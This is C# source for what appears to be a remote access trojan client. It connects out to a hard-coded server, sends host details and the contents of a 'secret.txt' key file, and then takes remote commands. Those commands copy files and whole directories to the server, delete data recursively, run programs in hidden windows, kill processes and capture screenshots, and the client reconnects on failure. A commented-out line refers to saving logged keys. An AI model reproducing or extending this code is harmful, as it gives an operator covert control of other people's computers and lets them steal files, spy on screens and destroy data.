﻿using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Security.AccessControl;
using System.Diagnostics;
using System.Threading;
using Newtonsoft.Json;
using System.Net.NetworkInformation;
using ServClieAp.clasess;
using System.Management;
using System.Collections.Generic;

class Program
{
    static IPAddress serverAddress = IPAddress.Parse("192.168.1.121");
    static IPAddress localAddress = IPAddress.Any;
    //static string serverDomain = "vps-e12dfd38.vps.ovh.ca";
    //static IPAddress serverAddress = Dns.GetHostAddresses(serverDomain)[0];
    static  int port = 6666;
    static void Main(string[] args)
    {
        HandleClient();
    }
    static void HandleClient()
    {
        TcpClient client = new TcpClient();
        client.Connect(serverAddress, port);
        NetworkStream stream = client.GetStream();
        ConnectToMachine(stream);
        Console.WriteLine("Connected to server.");
        try
        {
            while (true)
            {
                string command = ReceiveCommand(stream);
                if (command == null)
                    break;

                string response = ProcessCommand(command, stream);
                SendResponse(stream, response);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An error occurred: {ex.Message}");
            Random r=new Random();
            Thread.Sleep(r.Next(1000, 10000));
            HandleClient();
        }
        finally
        {
            stream.Close();
            client.Close();
        }
    }
    static void ConnectToMachine(NetworkStream stream)
    {
        var systemInfo = GetSystemInfo();

        // Определите каталог исполняемого файла
        string exeDirectory = AppDomain.CurrentDomain.BaseDirectory;
        string filePath = Path.Combine(exeDirectory, "secret.txt"); // Постройте абсолютный путь к вашему файлу

        try
        {
            // Чтение всего текста из файла
            string[] keyLines = File.ReadAllLines(filePath);

            // Создаем список для хранения ключей
            systemInfo.SecretKeys = new List<string>(keyLines);
            Console.WriteLine("File Content:");
            foreach (string key in systemInfo.SecretKeys)
            {
                Console.WriteLine(key);
            }
        }
        catch (Exception e)
        {
            Console.WriteLine($"An error occurred: {e.Message}");
        }

        Console.WriteLine(JsonConvert.SerializeObject(systemInfo, Formatting.Indented));
        SendSystemInfo(stream, systemInfo);
    }
    //static string SelectMachineOrEnterKey(NetworkStream stream)
    //{

    //}
    static SystemInfo GetSystemInfo()
    {
        var systemInfo = new SystemInfo
        {
            Type = "server", // Устанавливаем тип соединения
            MachineName = Environment.MachineName,
            OSVersion = Environment.OSVersion.ToString(),
            ProcessorCount = Environment.ProcessorCount,
            MacAddress = GetMacAddress()
        };

        var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
        foreach (ManagementObject queryObj in searcher.Get())
        {
            systemInfo.TotalVisibleMemory = queryObj["TotalVisibleMemorySize"]?.ToString();
            systemInfo.FreePhysicalMemory = queryObj["FreePhysicalMemory"]?.ToString();
            systemInfo.TotalVirtualMemory = queryObj["TotalVirtualMemorySize"]?.ToString();
            systemInfo.FreeVirtualMemory = queryObj["FreeVirtualMemory"]?.ToString();
        }

        return systemInfo;
    }
    static string GetMacAddress()
    {
        string macAddress = "MAC Address Not Found";
        foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.NetworkInterfaceType != NetworkInterfaceType.Loopback && nic.OperationalStatus == OperationalStatus.Up)
            {
                macAddress = nic.GetPhysicalAddress().ToString();
                if (!string.IsNullOrEmpty(macAddress))
                {
                    break;
                }
            }
        }
        return macAddress;
    }
    static void SendSystemInfo(NetworkStream stream, SystemInfo systemInfo)
    {
        try
        {
            string json = JsonConvert.SerializeObject(systemInfo);
            byte[] data = Encoding.UTF8.GetBytes(json);
            stream.Write(data, 0, data.Length);
            Console.WriteLine("System info sent successfully.");

        }
        catch (Exception e)
        {
            Console.WriteLine($"Failed to send system info: {e.Message}");
        }
    }
    static string ReceiveCommand(NetworkStream stream)
    {
        byte[] buffer = new byte[8192];
        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        return Encoding.UTF8.GetString(buffer, 0, bytesRead);
    }

    static void SendResponse(NetworkStream stream, string response)
    {
        byte[] responseBytes = Encoding.UTF8.GetBytes(response);
        stream.Write(responseBytes, 0, responseBytes.Length);
        stream.Flush();
    }

    static string ProcessCommand(string command, NetworkStream stream)
    {
        string[] parts = command.Split(' ');
        string action = parts[0].ToLower();
        string path = "";
        if (action != "scr")
        {
            if (action.StartsWith("copy") || action.StartsWith("send"))
            {
                if (parts.Length > 1)
                {
                    for (int i = 1; i < parts.Length; i++)
                    {
                        path += " " + parts[i];
                    }
                }
                else
                {
                    return "Unknown command";
                }
            }
            else
            {
                if (parts.Length > 1)
                {
                    for (int i = 1; i < parts.Length; i++)
                    {
                        path += parts[i] + " ";
                    }
                }
                else
                {
                    return "Unknown command";
                }
            }
        }
        
       


        switch (action)
        {
            case "dir":
                return ListDirectory(path);
            case "cd":
                return ChangeDirectory(path);
            case "copy":
                return SendFileOrDirectory(path, stream);
            case "delete":
                return DeleteFileOrDirectory(stream,path);
            case "scr":return GetScreanshoot(stream);
            case "send":
                if (Directory.Exists(path))
                {
                    SendResponse(stream, "Directory setup succsess");
                }
                else
                {
                    SendResponse(stream, "Directory does not exist");
                    return "";
                }
                ReceiveFileOrDirectory(stream, path);
                return "Recevide";
            case "move":
                string[] moveParts = path.Split(' ');
                if (moveParts.Length != 3)
                {
                    return "Invalid command format. Please use: move <sourcePath> <destinationPath>";
                }
                string sourcePath = moveParts[1];
                string destinationPath = moveParts[2];
                return MoveFileOrDirectory(sourcePath, destinationPath);
            case "run":
                return RunProcess(path);
            case "proc":
                if (path.StartsWith("get "))
                {
                    return ElevatedProccessChecker.GetProcesses();
                }
                else if (path.StartsWith("kill"))
                {
                    string[] killParts = path.Split(' ');
                    if (killParts.Length < 2)
                    {
                        return "Invalid command format. Please use: proc kill <processID>";
                    }
                    int processID;
                    if (int.TryParse(killParts[1], out processID))
                    {
                        return KillProcess(processID);
                    }
                    else
                    {
                        return "Invalid process ID. Please provide a valid integer process ID.";
                    }
                }
                else
                {
                    return "Invalid 'proc' command. Use 'proc get' to retrieve all processes or 'proc kill <processID>' to terminate a process.";
                }
            //case "keysave":Logger.WriteBufferToFile();return "Keys saved";
            default:
                return "Unknown command";
        }
    }

    static string ChangeDirectory(string path)
    {
        try
        {
            if (string.IsNullOrEmpty(path))
                return "Please provide a directory path.";

            Directory.SetCurrentDirectory(path);
            return $"Changed directory to '{path}'.";
        }
        catch (Exception ex)
        {
            return $"Error changing directory: {ex.Message}";
        }
    }

    static string SendFileOrDirectory(string path, NetworkStream stream)
    {
        try
        {
            if (string.IsNullOrEmpty(path))
                return "Please provide a file or directory path.";

            if (System.IO.File.Exists(path))
            {
                SendFile(path, stream);
                return $"File '{Path.GetFileName(path)}' sent.";
            }
            else if (Directory.Exists(path))
            {
                SendDirectory(path, stream);
                return $"Directory '{Path.GetFileName(path)}' sent.";
            }
            else
            {
                return "File or directory not found.";
            }
        }
        catch (Exception ex)
        {
            return $"Error sending file or directory: {ex.Message}";
        }
    }

    static void SendDirectory(string directoryPath, NetworkStream stream)
    {
        if (directoryPath.Last() != '\\')
        {
            SendResponse(stream, $"Directory: {Path.GetDirectoryName(directoryPath + "\\")}");
            if(!EndProcessMessageGeter(stream,"Directory get ok"))
            {
                Console.WriteLine("Directory get error");
            }
        }
        else
        {
            SendResponse(stream, $"Directory: {Path.GetDirectoryName(directoryPath)}");
            if (!EndProcessMessageGeter(stream, "Directory get ok"))
            {
                Console.WriteLine("Directory get error");
            }
        }
        // Отправляем сообщение о начале передачи содержимого каталога
       

        // Отправляем файлы в каталоге
        foreach (string filePath in Directory.GetFiles(directoryPath))
        {
            SendFile(filePath, stream);
        }

        // Рекурсивно отправляем содержимое подкаталогов
        foreach (string subDirectoryPath in Directory.GetDirectories(directoryPath))
        {
            SendDirectory(subDirectoryPath, stream);
        }

        // Сообщаем о завершении передачи каталога
        SendResponse(stream, "End of directory");
        if (!EndProcessMessageGeter(stream, "End of directory ok"))
        {
            Console.WriteLine("End of directory client error");
        }
    }
    static bool EndProcessMessageGeter(NetworkStream stream, string processName)
    {
       byte[] confirmationBuffer = new byte[8192];
      int  confirmationBytesRead = stream.Read(confirmationBuffer, 0, confirmationBuffer.Length);
      string  confirmationMessage = Encoding.UTF8.GetString(confirmationBuffer, 0, confirmationBytesRead).Trim();
        if (confirmationMessage == processName)
        {
            return true;
        }
        else
        {
           return false;
        }
        // НАДО ЗАКОНЧИТЬ ЕТУ ФУНКЦИЮ ПРИЕМА ПОДТВЕРЖДЕНИЯ ОТ КЛИЕНТА!!!!!!!!!!!!!!!!!
    }
    static void SendFile(string filePath, NetworkStream stream)
    {
        long fileSize = new FileInfo(filePath).Length;
        string fileNameMessage = $"File: '{Path.GetFileName(filePath)}'";
        byte[] fileNameBytes = Encoding.UTF8.GetBytes(fileNameMessage);
        stream.Write(fileNameBytes, 0, fileNameBytes.Length);
        stream.Flush();

        // Ожидаем подтверждение от клиента о том, что файл был успешно принят

        if (!EndProcessMessageGeter(stream, "FileNameReceived"))
        {
            Console.WriteLine("Error: File name not received confirmation received.");
            return;
        }

        byte[] fileSizeBytes = BitConverter.GetBytes(fileSize);
        stream.Write(fileSizeBytes, 0, fileSizeBytes.Length);
        stream.Flush();
        if (!EndProcessMessageGeter(stream, "FileSizeReceived"))
        {
            Console.WriteLine("Error: File size not received confirmation received.");
            return;
        }
        using (var fileStream = System.IO.File.OpenRead(filePath))
        {
            fileStream.CopyTo(stream);
        }
        if (!EndProcessMessageGeter(stream,"FileReceived"))
        {
            Console.WriteLine("Error: File not received confirmation received.");
            return;
        }
    }
    static string DeleteFileOrDirectory(NetworkStream stream, string path)
    {
        string response = "";
        try
        {
            if (string.IsNullOrEmpty(path))
                response = "Please provide a file or directory path.";

            if (System.IO.File.Exists(path))
            {
                System.IO.File.Delete(path);
                response = $"File '{Path.GetFileName(path)}' deleted.";
            }
            else if (Directory.Exists(path))
            {
                Directory.Delete(path, true); // Удалить папку и все ее содержимое
                response = $"Directory '{Path.GetFileName(path)}' deleted.";
            }
            else
            {
                response = "File or directory not found.";
            }
        }
        catch (Exception ex)
        {
            response = $"Error deleting file or directory: {ex.Message}";
        }
        finally
        {
            SendResponse(stream, response);
           
        }
        return "d";
    }
    static string ListDirectory(string path)
    {
        try
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(path);

            // Получаем разрешения доступа к папке
            DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

            if (string.IsNullOrEmpty(path))
                path = Directory.GetCurrentDirectory();

            string[] files = Directory.GetFiles(path);
            string[] directories = Directory.GetDirectories(path);

            StringBuilder result = new StringBuilder();
            result.AppendLine($"Files in directory '{path}':");
            foreach (string file in files)
            {
                result.AppendLine($"- {Path.GetFileName(file)}");
            }
            result.AppendLine($"Directories in directory '{path}':");
            foreach (string directory in directories)
            {
                result.AppendLine($"- {Path.GetFileName(directory)}");
            }

            return result.ToString();
        }
        catch (Exception ex)
        {
            return $"Error listing directory: {ex.Message}";
        }
    }

    static string ReceiveResponse(NetworkStream stream)
    {
        byte[] buffer = new byte[8192];
        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        return Encoding.UTF8.GetString(buffer, 0, bytesRead);
    }

    static void ReceiveFileOrDirectory(NetworkStream stream, string currentDirectory = "")
    {
        
        while (true)
        {
            byte[] buffer = new byte[8192];
            int bytesRead = stream.Read(buffer, 0, buffer.Length);
            string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);

            if (message.StartsWith("Directory"))
            {
                string directoryName = message.Split('\\').LastOrDefault();
                string directoryPath = Path.Combine(currentDirectory, directoryName);

                Directory.CreateDirectory(directoryPath);
                Console.WriteLine($"Directory created: {directoryPath}");
                EndProcessMessage(stream, "Directory get ok");
                ReceiveFileOrDirectory(stream, directoryPath); // Рекурсивно обрабатываем подпапки
            }
            else if (message.StartsWith("End of directory"))
            {
                Console.WriteLine(message);
                EndProcessMessage(stream, "End of directory ok");
                return; // Возвращаемся к предыдущей папке после завершения обработки текущего каталога
            }
            else
            {
                string fileName = message.Split('\'')[1];
                string filePath = Path.Combine(currentDirectory, fileName);
                ReceiveFile(stream, filePath);
            }
        }
    }

    static void EndProcessMessage(NetworkStream stream, string processName)
    {
        byte[] confirmationMessage = Encoding.UTF8.GetBytes(processName);
        stream.Write(confirmationMessage, 0, confirmationMessage.Length);
        stream.Flush();
    }
    static void ReceiveFile(NetworkStream stream, string defaultFileName)
    {
        EndProcessMessage(stream, "FileNameReceived");
        byte[] fileSizeBuffer = new byte[sizeof(long)];
        stream.Read(fileSizeBuffer, 0, fileSizeBuffer.Length);
        long fileSize = BitConverter.ToInt64(fileSizeBuffer, 0);
        EndProcessMessage(stream, "FileSizeReceived");
        using (FileStream fileStream = new FileStream(defaultFileName, FileMode.Create))
        {
            byte[] buffer = new byte[8192];
            long totalBytesRead = 0;
            int bytesRead;

            while (totalBytesRead < fileSize && (bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
            {
                fileStream.Write(buffer, 0, bytesRead);
                totalBytesRead += bytesRead;
            }
        }
        // Отправляем подтверждение серверу о том, что файл был успешно принят
        EndProcessMessage(stream, "FileReceived");
        Console.WriteLine($"File '{defaultFileName}' received from server.");
    }

    static string MoveFileOrDirectory(string sourcePath, string destinationPath)
    {
        try
        {
            if (string.IsNullOrEmpty(sourcePath) || string.IsNullOrEmpty(destinationPath))
                return "Please provide both source and destination paths.";

            if (!System.IO.File.Exists(sourcePath) && !Directory.Exists(sourcePath))
                return "Source file or directory not found.";

            if (System.IO.File.Exists(sourcePath))
            {
                string fileName = Path.GetFileName(sourcePath);
                string newFilePath = Path.Combine(destinationPath, fileName);

                if (System.IO.File.Exists(newFilePath))
                    return $"File '{fileName}' already exists in the destination directory.";

                System.IO.File.Move(sourcePath, newFilePath);
                return $"File '{fileName}' moved to '{destinationPath}'.";
            }
            else if (Directory.Exists(sourcePath))
            {
                string directoryName = new DirectoryInfo(sourcePath).Name;
                string newDirectoryPath = Path.Combine(destinationPath, directoryName);

                if (Directory.Exists(newDirectoryPath))
                    return $"Directory '{directoryName}' already exists in the destination directory.";

                Directory.Move(sourcePath, newDirectoryPath);
                return $"Directory '{directoryName}' moved to '{destinationPath}'.";
            }
            else
            {
                return "Source file or directory not found.";
            }
        }
        catch (Exception ex)
        {
            return $"Error moving file or directory: {ex.Message}";
        }
    }
    static string RunProcess(string command)
    {
        try
        {
            // Split the command into parts
            string[] parts = command.Split(' ');

            // Extract the file path (assumes the file path doesn't contain spaces)
            string filePath = parts[0];

            // Determine the window style
            ProcessWindowStyle windowStyle = ProcessWindowStyle.Normal;
            bool createNoWindow = false;
            string arguments = string.Empty;

            // Parse the command for -n and -h options
            for (int i = 1; i < parts.Length; i++)
            {
                if (parts[i] == "-n")
                {
                    // Collect arguments that follow -n
                    for (int j = i + 1; j < parts.Length; j++)
                    {
                        arguments += parts[j] + " ";
                    }
                    arguments = arguments.Trim();
                    break;
                }
                else if (parts[i] == "-h")
                {
                    windowStyle = ProcessWindowStyle.Hidden;
                    createNoWindow = true;

                    // Collect arguments that follow -h
                    for (int j = i + 1; j < parts.Length; j++)
                    {
                        arguments += parts[j] + " ";
                    }
                    arguments = arguments.Trim();
                    break;
                }
            }

            // Check if the file exists
            if (!File.Exists(filePath))
            {
                return $"File '{filePath}' does not exist.";
            }

            // Setup the process start info
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = filePath,
                Arguments = arguments,
                UseShellExecute = true,
                CreateNoWindow = createNoWindow,
                WindowStyle = windowStyle,
                Verb = "open"
            };

            // Start the process
            Process process = Process.Start(startInfo);
            return $"Process started: '{filePath}' with arguments: '{arguments}'";
        }
        catch (Exception ex)
        {
            return $"Error running process: {ex.Message}";
        }
    }
    //static string GetProcesses()
    //{
    //    try
    //    {
    //        Process[] processes = Process.GetProcesses().OrderBy(p => p.ProcessName).ToArray();
    //        StringBuilder result = new StringBuilder();
    //        result.AppendLine("Processes:");
    //        foreach (Process process in processes)
    //        {
    //            result.AppendLine($"- Name: {process.ProcessName}, ID: {process.Id}");
    //        }
    //        return result.ToString();
    //    }
    //    catch (Exception ex)
    //    {
    //        return $"Error getting processes: {ex.Message}";
    //    }
    //}
    static string KillProcess(int processID)
    {
        try
        {
            Process process = Process.GetProcessById(processID);
            process.Kill();
            return $"Process with ID {processID} has been terminated.";
        }
        catch (ArgumentException)
        {
            return $"Process with ID {processID} does not exist.";
        }
        catch (Exception ex)
        {
            return $"Error terminating process: {ex.Message}";
        }
    }
    static string GetScreanshoot(NetworkStream stream)
    {
        try
        {
           string path= ScreenCapture.CaptureScreen();
            SendFile(path,stream);
            //File.Delete(path);
            return "Successfully screenshot!!!";
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error in screenshot: " + ex.Message);
            return "Error in screenshot: " + ex.Message;
        }
    }

}
